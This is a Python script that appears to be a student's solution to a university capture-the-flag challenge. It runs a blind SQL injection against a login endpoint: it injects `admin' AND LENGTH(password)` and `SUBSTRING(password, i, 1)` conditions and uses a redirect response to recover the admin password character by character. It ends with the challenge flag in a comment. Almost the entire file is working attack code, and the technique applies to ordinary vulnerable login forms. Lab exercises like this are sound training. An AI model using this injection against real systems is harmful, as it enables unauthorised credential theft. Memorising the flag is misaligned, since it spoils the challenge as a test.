import requests

url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1505'
netid = 'xz4344'
cookies = {"CHALBROKER_USER_ID": netid}

print("[*] Starting to find the password length...")
password_length = None
try: 
    for length in range(30, 91):
        data = {
            "username": f"admin' AND LENGTH(password) = {length}--",
            "password": "random"
        }
        response = requests.post(f'{url}/login', data=data, cookies=cookies, allow_redirects=False)
        if response.status_code == 302:
            password_length = length
            print(f"[+] Succeed to attempt length {length}")
            print(f"[+] The password length is {password_length}")
            break
        else:
            print(f"[-] Failed to attempt length {length}")
except requests.exceptions.RequestException as e:
    print(f"[-] Request failed during length detection: {e}")
    exit()
print("[*] Finished finding the password length")

print("[*] Starting to find the password...")
password = ""
charset = "_{}0123456789abcdefghijklmnopqrstuvwxyz"
try:
    for i in range(1, password_length + 1):
        for char in charset:
            data = {
                "username": f"admin' AND SUBSTRING(password, {i}, 1) = '{char}'--",
                "password": "random"
            }
            response = requests.post(f'{url}/login', data=data, cookies=cookies, allow_redirects=False)
            if response.status_code == 302:
                password += char
                print(f"[+] Found the {i}th character {char}")
                print(f"[+] The current password is {password}")
                break
    print(f"[+] The complete password is {password}")
except requests.exceptions.RequestException as e:
    print(f"[-] Request failed during password detection: {e}")
    exit()
print("[*] Finished finding the password")

# flag{n0_sql_w4s_h4rm3d_1n_m4k1ng_th1s_ch4ll3ng3_717642e760c8212f}
